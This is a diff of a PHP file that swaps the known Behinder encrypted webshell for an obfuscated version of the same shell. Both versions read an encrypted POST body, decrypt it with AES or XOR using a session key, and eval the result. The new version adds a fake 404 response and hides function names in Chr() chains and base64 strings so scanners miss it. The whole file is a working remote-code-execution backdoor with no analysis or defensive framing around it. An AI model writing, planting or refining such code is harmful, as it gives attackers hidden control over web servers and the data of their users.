@@ -1,26 +1,15 @@
 <?php
-@error_reporting(0);
-session_start();
-    $key="<<<PASSWORD>>>"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
-	$_SESSION['k']=$key;
-	session_write_close();
-	$post=file_get_contents("php://input");
-	if(!extension_loaded('openssl'))
-	{
-		$t="base64_"."decode";
-		$post=$t($post."");
-
-		for($i=0;$i<strlen($post);$i++) {
-    			 $post[$i] = $post[$i]^$key[$i+1&15];
-    			}
-	}
-	else
-	{
-		$post=openssl_decrypt($post, "AES128", $key);
-	}
-    $arr=explode('|',$post);
-    $func=$arr[0];
-    $params=$arr[1];
-	class C{public function __invoke($p) {eval($p."");}}
-    @call_user_func(new C(),$params);
-?>
+header("HTTP/1.0 404 Not Found");@error_reporting(0);
+session_start();${strliu}="<<<PASSWORD>>>";
+$_SESSION['k']=${strliu};session_write_close();
+${strqi} = Chr(98).Chr(97).Chr(115).Chr(101).Chr(54).Chr(52).Chr(95);
+${strwu} = "\x63\x6f\x64\x65";${strsan} = ${strqi}.Chr(100).Chr(101).${strwu};
+${strsi} = ${strsan}("ZmlsZV9nZXRfY29udGVudHM=");${strer} = ${strsan}("cGhwOi8vaW5wdXQ=");
+${stryi} = ${strsan}("b3BlbnNzbF9kZWNyeXB0");${strshiyi}=${strsi}(${strer});
+if(!extension_loaded('openssl')) {${strba} = function(${strshisi}, ${strshiwu}) {
+return chr(ord(${strshisi}) ^ ord(${strshiwu}));};
+for(${strshisan} = 0; ${strshisan} < strlen(${strshiyi}); ${strshisan}++) {
+${strshiyi}[${strshisan}] = ${strba}(${strshiyi}[${strshisan}], ${strliu}[(${strshisan} +Chr("49"))&chr(49).chr(53)]);
+}}else{${strshiyi}=${stryi}(${strshiyi}, "AES128", ${strliu});}
+${strshier}=explode('|',${strshiyi});${strjiu}=${strshier}[1];
+define("{strshi}","//{strsi}\r\n".${strjiu});@eval({strshi});
